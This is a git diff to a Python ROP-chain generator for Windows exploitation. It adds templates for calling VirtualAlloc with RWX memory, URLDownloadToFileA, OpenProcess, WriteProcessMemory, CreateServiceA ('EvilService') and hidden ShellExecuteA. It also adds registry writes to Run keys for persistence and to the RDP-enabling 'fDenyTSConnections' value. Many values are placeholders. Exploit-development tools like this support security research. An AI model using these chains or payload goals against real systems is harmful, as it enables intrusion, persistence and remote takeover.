@@ -7905,7 +7905,7 @@ def loadMovD(z,i, bad, length1,excludeRegs,pk,pM=None, pI=None,mReg=None):
 	espDesiredMovement=0
 	# '9': {'valStr': 'Test_Str_Name 1', 'val': 5, 'specialHandling':False, 'StructPointer': False, 'StructType':None, 'com':'This is a test value'},
 	# print ("z", z, "i", i)
-	valStr, val, specialHandling, StructPointer, StructType,com=giveMovDValsFromDict(pat,z,i)
+	valStr, val, specialHandling, hasPointer, StructPointer, StructType,com=giveMovDValsFromDict(pat,z,i)
 	regsNotUsed=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
 	for r in excludeRegs:
 		regsNotUsed.remove(r)
@@ -8069,7 +8069,7 @@ def loadRegP(z,i, bad, length1,excludeRegs,pk,distEsp=0):
 
 	#taco
 	
-	elif com2=="create pointer" or com2=="crP":
+	elif com2=="create pointer" or com2=="crP" or rValStr=="lpData":
 		# foundStart, gT=findMovDerefGetStackNotReg(reg,None, bad,length1, excludeRegs,0,0xFFFFFE68, val)  ## - 0x198 - we will put a dereference there for it.
 		# foundM1, gT = findMovDeref2(reg,"eax",bad,length1, availableRegs,0)
 		foundStart, pk2=findMovDerefGetStackNotRegNone(reg, bad,length1, excludeRegs,0,0xFFFFFE68,val)  ## - 0x198 - we will put a dereference there for it.
@@ -8078,6 +8078,7 @@ def loadRegP(z,i, bad, length1,excludeRegs,pk,distEsp=0):
 		FoundDistG=True
 		# showChain(pk2,True,True)
 		pass
+		return True, 0, pk2,reg
 
 	try:
 		if hasImg[rValStr]:
@@ -11825,7 +11826,6 @@ class getParamVals:
 		# TODO: make 0x30702 will be a pointer to DeleteFileA
 		bFound, df,comment  =  pv.get_dfPTR_RT(name, excludeRegs, r, r2, bad, pk)
 		comment="create pointer"  # this is required, to be converted into a pointer
-
 		return bFound, df, comment
 
 	def get_dfPTR_RT(self,name,excludeRegs,r,r2,bad,pk):		
@@ -11856,7 +11856,6 @@ class getParamVals:
 		comment="create pointer"  # this is required, to be converted into a pointer
 		return bFound, w, comment
 
-
 	def get_winPTR_RT(self,name,excludeRegs,r,r2,bad,pk):		
 		wE=0x77443322
 		comment=""
@@ -11885,17 +11884,19 @@ class getParamVals:
 		return bVal,p,com
 
 	def get_dwSize(self,name,excludeRegs,r,r2,bad,pk):
+		value=0x409
 		comment=""
-		return True, 0x409,comment
+		return True, value,comment
 	
 	def get_dwSize2(self,name,excludeRegs,r,r2,bad,pk):
+		value=0x01
 		comment=" - dwSize"
-		return True, 0x01,comment
-
+		return True, value,comment
 
 	def get_flAllocationType(self,name,excludeRegs,r,r2,bad,pk):
+		value=0x1000
 		comment=" flAllocationType (MEM_COMMIT)"
-		return True, 0x1000,comment
+		return True, value,comment
 
 	def get_flNewProtect(self,name,excludeRegs,r,r2,bad,pk):
 		comment=" - RWX"
@@ -11968,6 +11969,7 @@ class getParamVals:
 			return True, rC2p,comment
 		# dp ("returning false")
 		return False,0,"Ret C2 not found"
+
 	def get_addESP(self,name,excludeRegs,r,r2,bad,pk):
 		dp ("get_addESP",name)
 		foundAdd,pAE,chAE= findAddValtoESP(r2,bad, excludeRegs)
@@ -11975,7 +11977,8 @@ class getParamVals:
 		comment=""
 		if foundAdd:
 			return True, pAE,comment
-		return False,0,"Add ESP not found"		
+		return False,0,"Add ESP not found"
+
 	def get_targetDllString(self,name,excludeRegs,r,r2,bad,pk):
 		#not sure - use globals for target string, etc, or object?
 		foundT1=True
@@ -11983,6 +11986,7 @@ class getParamVals:
 		if foundT1:
 			return True, 0xbaddbadd,comment
 		return False,0,""
+
 	def get_targetDllString2(self,name,excludeRegs,r,r2,bad,pk):
 		#not sure - use globals for target string, etc, or object?
 		dp ("get_targetDllString2 called")
@@ -11993,7 +11997,7 @@ class getParamVals:
 		return False,0,""
 
 	def get_CTh32SPtr(self, name, excludeRegs, r, r2, bad, pk):
-		# TODO: make 0x30802 which will be a pointer to CreateToolhelp32SnapshotStub
+	# TODO: make 0x30802 which will be a pointer to CreateToolhelp32SnapshotStub
 		bFound, Cth32_RT,comment  =  pv.get_CTh32SPtr_RT(name, excludeRegs, r, r2, bad, pk)
 		comment="create pointer"  # this is required, to be converted into a pointer
 		return bFound, Cth32_RT, comment
@@ -12011,7 +12015,7 @@ class getParamVals:
 				foundLL=True
 			except:
 				foundLL=False
-				comment=" - Ptr to CreateToolhelp32Snapshot not found. Simulated placeholder."
+				comment=" - CreateToolhelp32Snapshot not found. Simulated placeholder."
 		if foundLL:
 			dp ("returning ptr to CreateToolhelp32Snapshot")	
 			comment=" = Ptr to CreateToolhelp32Snapshot"
@@ -12031,7 +12035,6 @@ class getParamVals:
 	    return True, process_id_value, comment
 
 	def get_UDtFA_RT(self, name, excludeRegs, r, r2, bad, pk):
-	# TODO: implement the runtime address of URLDownloadToFileA
 		UDtFA_RT=0x0af0bd08
 		comment=""
 		foundLL=False
@@ -12044,13 +12047,13 @@ class getParamVals:
 				foundLL=True
 			except:
 				foundLL=False
-				comment=" - Ptr to URLDownloadToFile not found. 0x90909090 used as placeholder."
+				comment=" - URLDownloadToFile not found. 0x0af0bd08 used as placeholder."
 		if foundLL:
 			dp ("returning ptr to URLDownloadToFile")	
 			comment="Ptr to URLDownloadToFile"
 			return True, UDtFA_RT,comment
 		else:
-			return True,UDtFA_RT," - Simulated value - URLDownloadToFile ptr not found!"
+			return True,UDtFA_RT," - Simulated value - URLDownloadToFile not found!"
 		return False, UDtFA_RT, "URLDownloadToFile not Found"
 
 	def get_pCaller(self, name, excludeRegs, r, r2, bad, pk):
@@ -12059,15 +12062,15 @@ class getParamVals:
 		return True, value, comment
 
 	def get_szURL(self, name, excludeRegs, r, r2, bad, pk):
-	# TODO: use ESP to load a string like "http://httpbin.org/image/jpeg"
-		# varStr = "http://httpbin.org/image/jpeg"
+	# use ESP to load a string like "http://httpbin.org/image/jpeg"
+	# TODO: varStr = "http://httpbin.org/image/jpeg"
 		value=0x90909090
 		comment=''
 		return True, value, comment
 
 	def szFileName(self, name, excludeRegs, r, r2, bad, pk):
-	# TODO: load a string like "download-file1.jpeg"
-		# varStr = "download-file1.jpeg"
+	# load a string like "download-file1.jpeg"
+	# TODO: varStr = "download-file1.jpeg"
 		value=0x90909090
 		comment=''
 		return True, value, comment
@@ -12083,7 +12086,6 @@ class getParamVals:
 		return True, value, comment
 
 	def get_OP_RT(self, name, excludeRegs, r, r2, bad, pk):
-	# TODO: implement the runtime address of OpenProcess
 		OP_RT=0x0af0bd06
 		comment=""
 		foundLL=False
@@ -12096,13 +12098,13 @@ class getParamVals:
 				foundLL=True
 			except:
 				foundLL=False
-				comment=" - Ptr to OpenProcess not found. 0x0af0bd06 used as placeholder."
+				comment=" - OpenProcess not found. 0x0af0bd06 used as placeholder."
 		if foundLL:
 			dp ("returning ptr to OpenProcess")	
 			comment=" - Ptr to OpenProcess"
 			return True, OP_RT,comment
 		else:
-			return True,OP_RT,"Simulated value-OpenProcess ptr not found!"
+			return True,OP_RT," - Simulated value-OpenProcess not found!"
 		return False, OP_RT, "OpenProcess not Found"
 
 	def get_dwDesiredAccess(self, name, excludeRegs, r, r2, bad, pk):
@@ -12116,7 +12118,6 @@ class getParamVals:
 		return True, value, comment
 
 	def get_OP_PTR(self, name, excludeRegs, r, r2, bad, pk):
-	# TODO: implement pointer to OpenProcess
 		OP_PTR=0x0af0bd04
 		comment=""
 		foundLL=False
@@ -12129,23 +12130,16 @@ class getParamVals:
 				foundLL=True
 			except:
 				foundLL=False
-				comment=" - Ptr to OpenProcess not found. 0x90909090 used as placeholder."
+				comment=" - Ptr to OpenProcess not found. 0x0af0bd04 used as placeholder."
 		if foundLL:
 			dp ("returning ptr to OpenProcess")	
 			comment=" - Ptr to OpenProcess"
 			return True, OP_PTR,comment
 		else:
-			return True,OP_PTR,"Simulated value-OpenProcess ptr not found!"
+			return True,OP_PTR," - Simulated value-OpenProcess ptr not found!"
 		return False, OP_PTR, "OpenProcess not Found"
 
-	def get_dwProcessId():
-	# TODO: implement dwProcessId parameter with "MOV DEREFERENCE" which comes after the pushad and is the last parameter.
-	# dwProcessID points to the PID
-		comment=''
-		return True, 0x0, comment
-
 	def get_P32F_RT(self, name, excludeRegs, r, r2, bad, pk):
-	# TODO: implement runtime address of Process32First
 		P32F_RT=0x0af0bd02
 		comment=""
 		foundLL=False
@@ -12158,13 +12152,13 @@ class getParamVals:
 				foundLL=True
 			except:
 				foundLL=False
-				comment=" - Ptr to Process32First not found. 0x90909090 used as placeholder."
+				comment=" - Process32First not found. 0x0af0bd02 used as placeholder."
 		if foundLL:
 			dp ("returning ptr to Process32First")	
 			comment=" - Ptr to Process32First"
 			return True, P32F_RT,comment
 		else:
-			return True,P32F_RT,"Simulated value-Process32First ptr not found!"
+			return True,P32F_RT," - Simulated value-Process32First not found!"
 		return False, P32F_RT, "Process32First not Found"
 
 	def get_hSnapshot(self, name, excludeRegs, r, r2, bad, pk):
@@ -12181,7 +12175,6 @@ class getParamVals:
 		return True, value, comment
 
 	def get_RSKV_RT(self, name, excludeRegs, r, r2, bad, pk):
-	# TODO: implement runtime address of RegSetKeyValueA
 		RSKV_RT=0x0af0bd03
 		comment=""
 		foundLL=False
@@ -12194,19 +12187,19 @@ class getParamVals:
 				foundLL=True
 			except:
 				foundLL=False
-				comment=" - Ptr to RegSetKeyValueA not found. 0x90909090 used as placeholder."
+				comment=" - RegSetKeyValueA not found. 0x0af0bd03 used as placeholder."
 		if foundLL:
 			dp ("returning ptr to RegSetKeyValueA")	
 			comment=" - Ptr to RegSetKeyValueA"
 			return True, RSKV_RT,comment
 		else:
-			return True,RSKV_RT,"Simulated value-RegSetKeyValueA ptr not found!"
+			return True,RSKV_RT," - Simulated value-RegSetKeyValueA not found!"
 		return False, RSKV_RT, "RegSetKeyValueA not Found"
 
 	def get_lpData(self, name, excludeRegs, r, r2, bad, pk):
 	# TODO: implement a pointer to 0x1
 		comment=''
-		return True, 0x0, comment
+		return True, 0x1, comment
 
 	def get_cbData(self, name, excludeRegs, r, r2, bad, pk):
 		value=0x4
@@ -12224,17 +12217,47 @@ class getParamVals:
 		return True, value, comment
 
 	def get_lpValueName(self, name, excludeRegs, r, r2, bad, pk):
-	# TODO: implement varStr = 'fDenyTSConnections'
+	# TODO: varStr = 'fDenyTSConnections'
 		comment=''
 		return True, 0x0, comment
 
 	def get_lpSubKey_RSKV(self, name, excludeRegs, r, r2, bad, pk):
-	# TODO: implement varStr = 'SYSTEM\CurrentControlSet\Control\Terminal Server'
+	# TODO: varStr = 'SYSTEM\CurrentControlSet\Control\Terminal Server'
+		comment=''
+		return True, 0x0, comment
+
+	def get_lpData2(self, name, excludeRegs, r, r2, bad, pk):
+	# TODO: varStr = 'C:\Windows\System32\calc.exe'
+		comment=''
+		return True, 0x1, comment
+
+	def get_cbData2(self, name, excludeRegs, r, r2, bad, pk):
+		value=0x1d
+		comment=''
+		return True, value, comment
+
+	def get_dwType2(self, name, excludeRegs, r, r2, bad, pk):
+		value=0x1
+		comment=' - REG_SZ'
+		return True, value, comment
+
+	def get_hKey2_RSKV(self, name, excludeRegs, r, r2, bad, pk):
+	# TODO: implement handle returned from RegCreateKeyA
+		value=0x0
+		comment=' - handle from RegCreateKeyA'
+		return True, value, comment
+
+	def get_lpValueName2(self, name, excludeRegs, r, r2, bad, pk):
+	# TODO: varStr = 'calc'
+		comment=''
+		return True, 0x0, comment
+
+	def get_lpSubKey2_RSKV(self, name, excludeRegs, r, r2, bad, pk):
+	# TODO: varStr = 'randomkey'
 		comment=''
 		return True, 0x0, comment
 
 	def get_RCKV_RT(self, name, excludeRegs, r, r2, bad, pk):
-	# TODO: implement runtime address of RegCreateKeyA
 		RCKV_RT=0x0af0bd05
 		comment=""
 		foundLL=False
@@ -12247,13 +12270,13 @@ class getParamVals:
 				foundLL=True
 			except:
 				foundLL=False
-				comment=" - Ptr to RegCreateKeyA not found. 0x90909090 used as placeholder."
+				comment=" - RegCreateKeyA not found. 0x0af0bd05 used as placeholder."
 		if foundLL:
 			dp ("returning ptr to RegCreateKeyA")	
 			comment=" - Ptr to RegCreateKeyA"
 			return True, RCKV_RT,comment
 		else:
-			return True,RCKV_RT,"Simulated value-RegCreateKeyA ptr not found!"
+			return True,RCKV_RT," - Simulated value-RegCreateKeyA not found!"
 		return False, RCKV_RT, "RegCreateKeyA not Found"
 
 	def get_hKey_RCKV(self, name, excludeRegs, r, r2, bad, pk):
@@ -12262,13 +12285,196 @@ class getParamVals:
 		return True, value, comment
 
 	def get_lpSubKey_RCKV(self, name, excludeRegs, r, r2, bad, pk):
-	# TODO: implement varStr = 'SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'
+	# TODO: varStr = 'SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'
+		comment=''
+		return True, 0x0, comment
+
+	def get_lpSubKey2_RCKV(self, name, excludeRegs, r, r2, bad, pk):
+	# TODO: varStr = 'Software\Microsoft\Windows\CurrentVersion\Run'
 		comment=''
 		return True, 0x0, comment
 
 	def get_phkResult(self, name, excludeRegs, r, r2, bad, pk):
 	# TODO: implement a pointer which holds the output [OUT]
 		comment=''
+		return True, 0x0, comment
+
+	def get_WPM_RT(self, name, excludeRegs, r, r2, bad, pk):
+		WPM_RT=0x0af0cd01
+		comment=""
+		foundLL=False
+		try:
+			WPM_RT=dllDict["kernel32.dll"]["WriteProcessMemory"]
+			foundLL=True
+		except:
+			try:
+				WPM_RT=dllDict["kernelbase.dll"]["WriteProcessMemory"]
+				foundLL=True
+			except:
+				foundLL=False
+				comment=" - WriteProcessMemory not found. 0x0af0cd01 used as placeholder."
+		if foundLL:
+			dp ("returning ptr to WriteProcessMemory")
+			comment=" - Ptr to WriteProcessMemory"
+			return True, WPM_RT,comment
+		else:
+			return True,WPM_RT," - Simulated value-WriteProcessMemory not found!"
+		return False, WPM_RT, "WriteProcessMemory not Found"
+
+	def get_hProcess(self, name, excludeRegs, r, r2, bad, pk):
+		value=0xffffffff
+		comment=''
+		return True, value, comment
+
+	def get_lpBaseAddress(self, name, excludeRegs, r, r2, bad, pk):
+		value=0xaf0c0d0a
+		comment=' - placeholder for lpBaseAddress'
+		return True, value, comment
+
+	def get_HC_RT(self, name, excludeRegs, r, r2, bad, pk):
+		HC_RT=0x0af0cd02
+		comment=""
+		foundLL=False
+		try:
+			HC_RT=dllDict["kernel32.dll"]["HeapCreate"]
+			foundLL=True
+		except:
+			try:
+				HC_RT=dllDict["kernelbase.dll"]["HeapCreate"]
+				foundLL=True
+			except:
+				foundLL=False
+				comment=" - HeapCreate not found. 0x0af0cd02 used as placeholder."
+		if foundLL:
+			dp ("returning ptr to HeapCreate")
+			comment=" - Ptr to HeapCreate"
+			return True, HC_RT,comment
+		else:
+			return True,HC_RT," - Simulated value-HeapCreate not found!"
+		return False, HC_RT, "HeapCreate not Found"
+
+	def get_flOptions(self, name, excludeRegs, r, r2, bad, pk):
+		value=0x40000
+		comment=''
+		return True, value, comment
+
+	def get_dwInitialSize(self, name, excludeRegs, r, r2, bad, pk):
+		value=0x100
+		comment=''
+		return True, value, comment
+
+	def get_OSCM_RT(self, name, excludeRegs, r, r2, bad, pk):
+		OSCM_RT=0x0af0cd03
+		comment=""
+		foundLL=False
+		try:
+			OSCM_RT=dllDict["Advapi32.dll"]["OpenSCManagerA"]
+			foundLL=True
+		except:
+			try:
+				OSCM_RT=dllDict["Advapi32.dll"]["OpenSCManagerA"]
+				foundLL=True
+			except:
+				foundLL=False
+				comment=" - OpenSCManagerA not found. 0x0af0cd03 used as placeholder."
+		if foundLL:
+			dp ("returning ptr to OpenSCManagerA")
+			comment=" - Ptr to OpenSCManagerA"
+			return True, OSCM_RT,comment
+		else:
+			return True,OSCM_RT," - Simulated value-OpenSCManagerA not found!"
+		return False, OSCM_RT, "OpenSCManagerA not Found"
+
+	def get_lpMachineName(self, name, excludeRegs, r, r2, bad, pk):
+		value=0x0
+		comment=''
+		return True, value, comment
+
+	def get_lpDatabaseName(self, name, excludeRegs, r, r2, bad, pk):
+		value=0x0
+		comment=''
+		return True, value, comment
+
+	def get_CSA_RT(self, name, excludeRegs, r, r2, bad, pk):
+		CSA_RT=0x0af0cd04
+		comment=""
+		foundLL=False
+		try:
+			CSA_RT=dllDict["Advapi32.dll"]["CreateServiceA"]
+			foundLL=True
+		except:
+			try:
+				CSA_RT=dllDict["Advapi32.dll"]["CreateServiceA"]
+				foundLL=True
+			except:
+				foundLL=False
+				comment=" - CreateServiceA not found. 0x0af0cd04 used as placeholder."
+		if foundLL:
+			dp ("returning ptr to CreateServiceA")
+			comment=" - Ptr to CreateServiceA"
+			return True, CSA_RT,comment
+		else:
+			return True,CSA_RT," - Simulated value-CreateServiceA not found!"
+		return False, CSA_RT, "CreateServiceA not Found"
+
+	def get_hSCManager(self, name, excludeRegs, r, r2, bad, pk):
+	# TODO: point to the handle from OpenSCManagerA
+	# OpenSCManagerA puts in EAX
+		value=0x90909090
+		comment=' - handle from OpenSCManagerA'
+		return True, value, comment
+
+	def get_lpServiceName(self, name, excludeRegs, r, r2, bad, pk):
+	# TODO: varStr = 'EvilService'
+		comment=''
+		return True, 0x0, comment
+
+	def get_SEA_RT(self, name, excludeRegs, r, r2, bad, pk):
+		SEA_RT=0x0af0cd05
+		comment=""
+		foundLL=False
+		try:
+			SEA_RT=dllDict["Shell32.dll"]["ShellExecuteA"]
+			foundLL=True
+		except:
+			try:
+				SEA_RT=dllDict["Shell32.dl"]["ShellExecuteA"]
+				foundLL=True
+			except:
+				foundLL=False
+				comment=" - ShellExecuteA not found. 0x0af0cd05 used as placeholder."
+		if foundLL:
+			dp ("returning ptr to ShellExecuteA")
+			comment=" - Ptr to ShellExecuteA"
+			return True, SEA_RT,comment
+		else:
+			return True,SEA_RT," - Simulated value-ShellExecuteA not found!"
+		return False, SEA_RT, "ShellExecuteA not Found"
+
+	def get_hwnd(self, name, excludeRegs, r, r2, bad, pk):
+		comment=''
+		return True, 0x0, comment
+
+	def get_lpOperation(self, name, excludeRegs, r, r2, bad, pk):
+	# TODO: varStr = 'open'
+		comment=''
+		return True, 0x90909090, comment
+
+	def get_lpFile(self, name, excludeRegs, r, r2, bad, pk):
+	# TODO: varStr = 'calc'
+		comment=''
+		return True, 0x90909090, comment
+
+	def get_lpParameters(self, name, excludeRegs, r, r2, bad, pk):
+		comment=''
+		return True, 0x0, comment
+
+	def get_lpDirectory(self, name, excludeRegs, r, r2, bad, pk):
+		comment=''
+		return True, 0x0, comment
+
+	def get_nShowCmd(self, name, excludeRegs, r, r2, bad, pk):
+		comment=' - SW_HIDE'
 		return True, 0x0, comment
 
 pv=getParamVals()
@@ -13150,6 +13356,7 @@ pat = {  'LoLi1':{
         },
 
         'OP1':{
+        '9': {'valStr': 'dwProcessId', 'val': 0, 'specialHandling':False, 'hasPointer':False, 'StructPointer': False, 'StructType':None, 'com':'dwProcessId'}, # TODO: point to the PID; which comes from Process32First/Next
         '1': {'r': 'edi', 'val': 'ret_c2', 'excluded':[], "r2":'8','com':''},
 		'2': {'r': 'eax', 'val': 'bInheritHandle', 'excluded':[],"r2":"",'com':'bInheritHandle'},
 		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
@@ -13161,6 +13368,7 @@ pat = {  'LoLi1':{
         },
 
         'OP2':{
+        '9': {'valStr': 'dwProcessId', 'val': 0, 'specialHandling':False, 'hasPointer':False, 'StructPointer': False, 'StructType':None, 'com':'dwProcessId'}, # TODO: point to the PID; which comes from Process32First/Next
         '1': {'r': 'edi', 'val': 'ret_c2', 'excluded':[], "r2":'8','com':''},
 		'2': {'r': 'eax', 'val': 'bInheritHandle', 'excluded':[],"r2":"",'com':'bInheritHandle'},
 		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
@@ -13172,6 +13380,7 @@ pat = {  'LoLi1':{
         },
 
         'OP3':{
+        '9': {'valStr': 'dwProcessId', 'val': 0, 'specialHandling':False, 'hasPointer':False, 'StructPointer': False, 'StructType':None, 'com':'dwProcessId'}, # TODO: point to the PID; which comes from Process32First/Next
         '1': {'r': 'edi', 'val': 'pop', 'excluded':[], "r2":'','com':''},
 		'2': {'r': 'eax', 'val': 'bInheritHandle', 'excluded':[],"r2":"",'com':'bInheritHandle'},
 		'3': {'r': 'esi', 'val': 'OP_RT', 'excluded':[], "r2":"",'com':'OpenProcessStub'},
@@ -13183,6 +13392,7 @@ pat = {  'LoLi1':{
         },
 
         'OP4':{
+        '9': {'valStr': 'dwProcessId', 'val': 0, 'specialHandling':False, 'hasPointer':False, 'StructPointer': False, 'StructType':None, 'com':'dwProcessId'}, # TODO: point to the PID; which comes from Process32First/Next
         '1': {'r': 'edi', 'val': 'pop', 'excluded':[], "r2":'','com':''},
 		'2': {'r': 'eax', 'val': 'bInheritHandle', 'excluded':[],"r2":"",'com':'bInheritHandle'},
 		'3': {'r': 'esi', 'val': 'OP_PTR', 'excluded':[], "r2":"",'com':'Ptr to OpenProcess'},
@@ -13194,6 +13404,7 @@ pat = {  'LoLi1':{
         },
 
         'OP5':{
+        '9': {'valStr': 'dwProcessId', 'val': 0, 'specialHandling':False, 'hasPointer':False, 'StructPointer': False, 'StructType':None, 'com':'dwProcessId'}, # TODO: point to the PID; which comes from Process32First/Next
         '1': {'r': 'edi', 'val': 'ret_c2', 'excluded':[], "r2":'8','com':''},
 		'2': {'r': 'eax', 'val': 'bInheritHandle', 'excluded':[],"r2":"",'com':'bInheritHandle'},
 		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
@@ -13318,30 +13529,52 @@ pat = {  'LoLi1':{
         '1': {'r': 'edi', 'val': 'RSKV_RT', 'excluded':[], "r2":"",'com':'RegSetKeyValueAStub'},
 		'2': {'r': 'ecx', 'val': 'lpData', 'excluded':[], "r2":"",'com':'lpData'},
 		'3': {'r': 'esi', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
-		'4': {'r': 'ebp', 'val': 'hKey_RSKV', 'excluded':[], "r2":"",'com':'hKey_RSKV'},
-		'5': {'r': 'esp', 'val': 'lpSubKey_RSKV', 'excluded':[], "r2":"",'com':'lpSubKey_RSKV'},
+		'4': {'r': 'ebp', 'val': 'hKey_RSKV', 'excluded':[], "r2":"",'com':'hKey'},
+		'5': {'r': 'esp', 'val': 'lpSubKey_RSKV', 'excluded':[], "r2":"",'com':'lpSubKey'},
 		'6': {'r': 'ebx', 'val': 'lpValueName', 'excluded':[], "r2":"",'com':'lpValueName'},
 		'7': {'r': 'edx', 'val': 'dwType', 'excluded':[], "r2":"",'com':'dwType'},
 		'8': {'r': 'eax', 'val': 'cbData', 'excluded':[],"r2":"",'com':'cbData'}
+        },
+
+        "RSKV2":{
+        '1': {'r': 'edi', 'val': 'RSKV_RT', 'excluded':[], "r2":"",'com':'RegSetKeyValueAStub'},
+		'2': {'r': 'ecx', 'val': 'lpData2', 'excluded':[], "r2":"",'com':'lpData'},
+		'3': {'r': 'esi', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		'4': {'r': 'ebp', 'val': 'hKey2_RSKV', 'excluded':[], "r2":"",'com':'hKey'},
+		'5': {'r': 'esp', 'val': 'lpSubKey2_RSKV', 'excluded':[], "r2":"",'com':'lpSubKey'},
+		'6': {'r': 'ebx', 'val': 'lpValueName2', 'excluded':[], "r2":"",'com':'lpValueName'},
+		'7': {'r': 'edx', 'val': 'dwType2', 'excluded':[], "r2":"",'com':'dwType'},
+		'8': {'r': 'eax', 'val': 'cbData2', 'excluded':[],"r2":"",'com':'cbData'}
         },
 
         "RCKV1":{
         '1': {'r': 'edi', 'val': 'RCKV_RT', 'excluded':[], "r2":"",'com':'RegCreateKeyAStub'},
 		'2': {'r': 'ecx', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
 		'3': {'r': 'esi', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
-		'4': {'r': 'ebp', 'val': 'hKey_RCKV', 'excluded':[], "r2":"",'com':'hKey_RCKV'},
-		'5': {'r': 'esp', 'val': 'lpSubKey_RCKV', 'excluded':[], "r2":"",'com':'lpSubKey_RCKV'},
+		'4': {'r': 'ebp', 'val': 'hKey_RCKV', 'excluded':[], "r2":"",'com':'hKey'},
+		'5': {'r': 'esp', 'val': 'lpSubKey_RCKV', 'excluded':[], "r2":"",'com':'lpSubKey'},
+		'6': {'r': 'ebx', 'val': 'phkResult', 'excluded':[], "r2":"",'com':'phkResult'},
+		'7': {'r': 'edx', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		'8': {'r': 'eax', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'}
+        },
+
+ 		"RCKV2":{
+        '1': {'r': 'edi', 'val': 'RCKV_RT', 'excluded':[], "r2":"",'com':'RegCreateKeyAStub'},
+		'2': {'r': 'ecx', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		'3': {'r': 'esi', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		'4': {'r': 'ebp', 'val': 'hKey_RCKV', 'excluded':[], "r2":"",'com':'hKey'},
+		'5': {'r': 'esp', 'val': 'lpSubKey2_RCKV', 'excluded':[], "r2":"",'com':'lpSubKey2'},
 		'6': {'r': 'ebx', 'val': 'phkResult', 'excluded':[], "r2":"",'com':'phkResult'},
 		'7': {'r': 'edx', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
 		'8': {'r': 'eax', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'}
         },
 
         'Test1':{ 
-		'9': {'valStr': 'Test_Str_Name 1', 'val': 5, 'specialHandling':False, 'StructPointer': False, 'StructType':None, 'com':'Test_Str_Name 1'},
-		'10': {'valStr': 'Test_Str_Name 2', 'val': 23, 'specialHandling':False, 'StructPointer': False, 'StructType':None,'com':'Test_Str_Name 2'},
-		'11': {'valStr': 'Test_Str_Name 3', 'val': 4, 'specialHandling':False,'StructPointer': False, 'StructType':None, 'com':'Test_Str_Name 3'},
-		'12': {'valStr': 'Test_Str_Name 4', 'val': 0x44, 'specialHandling':True,'StructPointer': False, 'StructType':None,'com':'Test_Str_Name 4'},
-		'1': {'r': 'edi', 'val': 'x', 'excluded':[], "r2":'','com':''},
+		'9': {'valStr': 'Test_Str_Name 1', 'val': 5, 'specialHandling':False, 'hasPointer':False, 'StructPointer': False, 'StructType':None, 'com':'Test_Str_Name 1'},
+		'10': {'valStr': 'Test_Str_Name 2', 'val': 23, 'specialHandling':False, 'hasPointer':False, 'StructPointer': False, 'StructType':None,'com':'Test_Str_Name 2'},
+		'11': {'valStr': 'Test_Str_Name 3', 'val': 4, 'specialHandling':False, 'hasPointer':False, 'StructPointer': False, 'StructType':None, 'com':'Test_Str_Name 3'},
+		'12': {'valStr': 'Test_Str_Name 4', 'val': 0x44, 'specialHandling':True, 'hasPointer':False, 'StructPointer': False, 'StructType':None,'com':'Test_Str_Name 4'},
+		'1': {'r': 'edi', 'val': 'ropNop', 'excluded':[], "r2":'','com':''},
 		'2': {'r': 'ebp', 'val': 'x', 'excluded':[],"r2":"",'com':''},
 		'3': {'r': 'esi', 'val': 'x', 'excluded':[], "r2":"",'com':''},
 		'4': {'r': 'ecx', 'val': 'x', 'excluded':[], "r2":"",'com':''},
@@ -13360,20 +13593,107 @@ pat = {  'LoLi1':{
 		'6': {'r': 'ebx', 'val': 'x', 'excluded':[], "r2":"",'com':''},
 		'7': {'r': 'edx', 'val': 'x', 'excluded':[], "r2":"",'com':''},
 		'8': {'r': 'eax', 'val': 'x', 'excluded':[], "r2":"",'com':''}
-        }
+        },
+
+        'WPM1':{
+        '9': {'valStr': 'lpBuffer', 'val': 0, 'specialHandling':True, 'hasPointer':False, 'StructPointer': False, 'StructType':None, 'com':'lpBuffer'}, # TODO: specialHandling
+		'10': {'valStr': 'nSize', 'val': 0x80, 'specialHandling':False, 'hasPointer':False, 'StructPointer': False, 'StructType':None,'com':'nSize'},
+		'11': {'valStr': 'lpNumberOfBytesWritten', 'val': 0, 'specialHandling':False, 'hasPointer':False, 'StructPointer': False, 'StructType':None, 'com':'lpNumberOfBytesWritten'},
+        '1': {'r': 'edi', 'val': 'ropNop', 'excluded':[], "r2":'','com':'Rop nop'},
+		'2': {'r': 'ebp', 'val': 'pop', 'excluded':["edi", "esi"],"r2":"",'com':''},
+		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		'4': {'r': 'ecx', 'val': 'hProcess', 'excluded':[], "r2":"",'com':'hProcess'},
+		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
+		'6': {'r': 'ebx', 'val': 'WPM_RT', 'excluded':[], "r2":"",'com':'WriteProcessMemoryStub'},
+		'7': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		'8': {'r': 'eax', 'val': 'lpBaseAddress', 'excluded':[], "r2":"",'com':'lpBaseAddress'}
+        },
+
+        'HC1':{
+        '9': {'valStr': 'dwMaximumSize', 'val': 0, 'specialHandling':False, 'hasPointer':False, 'StructPointer': False, 'StructType':None, 'com':'dwMaximumSize'},
+		'1': {'r': 'edi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		'2': {'r': 'ebp', 'val': 'ropNop', 'excluded':[],"r2":"",'com':'Rop nop'},
+		'3': {'r': 'esi', 'val': 'ret_c2', 'excluded':[], "r2":"4",'com':''},
+		'4': {'r': 'ecx', 'val': 'flOptions', 'excluded':[], "r2":"",'com':'flOptions'},
